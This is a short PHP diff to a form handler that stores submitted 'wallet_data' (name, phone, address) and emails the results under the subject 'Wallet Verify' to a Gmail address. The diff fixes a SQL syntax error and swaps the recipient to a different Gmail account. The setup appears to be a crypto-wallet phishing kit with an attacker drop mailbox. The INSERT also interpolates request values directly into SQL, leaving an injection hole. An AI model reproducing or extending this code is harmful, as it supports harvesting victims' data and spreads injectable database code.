@@ -12,7 +12,7 @@ if (isset($_POST['submit'])) {
 
     $from_email = $db_handle->from_email();
 
-    $wallet_data = $db_handle->insertQuery("INSERT INTO `wallet_data`(`name`,`phone`,`address`,) VALUES ('$name','$phone','$address')");
+    $wallet_data = $db_handle->insertQuery("INSERT INTO `wallet_data`(`name`,`phone`,`address`) VALUES ('$name','$phone','$address')");
 
     $backend_message = '';
 
@@ -24,7 +24,7 @@ if (isset($_POST['submit'])) {
         $i++;
     }
 
-    $email_to = 'mingowhk@gmail.com';
+    $email_to = 'frogbidofficial@gmail.com';
     $subject = 'Wallet Verify';
 
     $headers = "From: Wallet Verify <" . $from_email . ">\r\n";
